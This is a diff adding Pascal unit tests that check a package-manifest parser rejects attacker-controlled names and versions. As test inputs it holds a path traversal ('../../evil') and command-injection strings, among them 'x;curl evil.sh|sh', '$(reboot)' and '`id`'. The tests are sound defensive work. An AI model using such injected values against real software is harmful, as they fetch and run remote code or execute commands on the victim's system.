@@ -43,6 +43,23 @@ type
     procedure TestMinVersionForMissing;
   end;
 
+  { Manifest fields are attacker-controlled input (fetched from a registry);
+    names and versions feed filesystem paths, URLs and subprocess arguments,
+    so hostile values must be rejected at parse time }
+  TTestManifestValidation = class(TTestCase)
+  private
+    function BuildManifestXml(const AName, AVersion: string;
+      const ADepName: string = ''; const ADepVersion: string = ''): string;
+  published
+    procedure TestValidManifestPasses;
+    procedure TestPathTraversalNameRejected;
+    procedure TestShellMetacharNameRejected;
+    procedure TestEmptyNameRejected;
+    procedure TestShellMetacharVersionRejected;
+    procedure TestInvalidDependencyNameRejected;
+    procedure TestInvalidDependencyVersionRejected;
+  end;
+
 implementation
 
 { TTestParseReleaseManifest }
@@ -273,8 +290,143 @@ begin
   end;
 end;
 
+{ TTestManifestValidation }
+
+function TTestManifestValidation.BuildManifestXml(const AName, AVersion: string;
+  const ADepName: string; const ADepVersion: string): string;
+var
+  Deps: string;
+begin
+  Deps := '';
+  if ADepName <> '' then
+    Deps :=
+      '  <dependencies>' + LineEnding +
+      '    <dependency>' + LineEnding +
+      '      <name>' + ADepName + '</name>' + LineEnding +
+      '      <version>' + ADepVersion + '</version>' + LineEnding +
+      '    </dependency>' + LineEnding +
+      '  </dependencies>' + LineEnding;
+
+  Result :=
+    '<?xml version="1.0" encoding="UTF-8"?>' + LineEnding +
+    '<release>' + LineEnding +
+    '  <name>' + AName + '</name>' + LineEnding +
+    '  <version>' + AVersion + '</version>' + LineEnding +
+    '  <origin>' + LineEnding +
+    '    <url>https://example.org/pkg.zip</url>' + LineEnding +
+    '    <sha256>e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855</sha256>' + LineEnding +
+    '  </origin>' + LineEnding +
+    Deps +
+    '</release>';
+end;
+
+procedure TTestManifestValidation.TestValidManifestPasses;
+var
+  Manifest: TReleaseManifest;
+begin
+  Manifest := TManifestParser.ParseVersionManifestFromString(
+    BuildManifestXml('fpgui-framework', '2.0.0', 'other-lib', '1.0.0'));
+  try
+    AssertEquals('fpgui-framework', Manifest.Name);
+    AssertEquals('2.0.0', Manifest.Version);
+  finally
+    Manifest.Free;
+  end;
+end;
+
+procedure TTestManifestValidation.TestPathTraversalNameRejected;
+var
+  Raised: Boolean;
+begin
+  Raised := False;
+  try
+    TManifestParser.ParseVersionManifestFromString(
+      BuildManifestXml('../../evil', '1.0.0')).Free;
+  except
+    on E: EManifestError do
+      Raised := True;
+  end;
+  AssertTrue('Path traversal in name should be rejected', Raised);
+end;
+
+procedure TTestManifestValidation.TestShellMetacharNameRejected;
+var
+  Raised: Boolean;
+begin
+  Raised := False;
+  try
+    TManifestParser.ParseVersionManifestFromString(
+      BuildManifestXml('x;curl evil.sh|sh', '1.0.0')).Free;
+  except
+    on E: EManifestError do
+      Raised := True;
+  end;
+  AssertTrue('Shell metacharacters in name should be rejected', Raised);
+end;
+
+procedure TTestManifestValidation.TestEmptyNameRejected;
+var
+  Raised: Boolean;
+begin
+  Raised := False;
+  try
+    TManifestParser.ParseVersionManifestFromString(
+      BuildManifestXml('', '1.0.0')).Free;
+  except
+    on E: EManifestError do
+      Raised := True;
+  end;
+  AssertTrue('Empty name should be rejected', Raised);
+end;
+
+procedure TTestManifestValidation.TestShellMetacharVersionRejected;
+var
+  Raised: Boolean;
+begin
+  Raised := False;
+  try
+    TManifestParser.ParseVersionManifestFromString(
+      BuildManifestXml('good-lib', '1.0.0$(reboot)')).Free;
+  except
+    on E: EManifestError do
+      Raised := True;
+  end;
+  AssertTrue('Shell metacharacters in version should be rejected', Raised);
+end;
+
+procedure TTestManifestValidation.TestInvalidDependencyNameRejected;
+var
+  Raised: Boolean;
+begin
+  Raised := False;
+  try
+    TManifestParser.ParseVersionManifestFromString(
+      BuildManifestXml('good-lib', '1.0.0', '../../other', '1.0.0')).Free;
+  except
+    on E: EManifestError do
+      Raised := True;
+  end;
+  AssertTrue('Invalid transitive dependency name should be rejected', Raised);
+end;
+
+procedure TTestManifestValidation.TestInvalidDependencyVersionRejected;
+var
+  Raised: Boolean;
+begin
+  Raised := False;
+  try
+    TManifestParser.ParseVersionManifestFromString(
+      BuildManifestXml('good-lib', '1.0.0', 'other-lib', '`id`')).Free;
+  except
+    on E: EManifestError do
+      Raised := True;
+  end;
+  AssertTrue('Invalid transitive dependency version should be rejected', Raised);
+end;
+
 initialization
   RegisterTest(TTestParseReleaseManifest);
   RegisterTest(TTestReleaseManifestCompat);
+  RegisterTest(TTestManifestValidation);
 
 end.
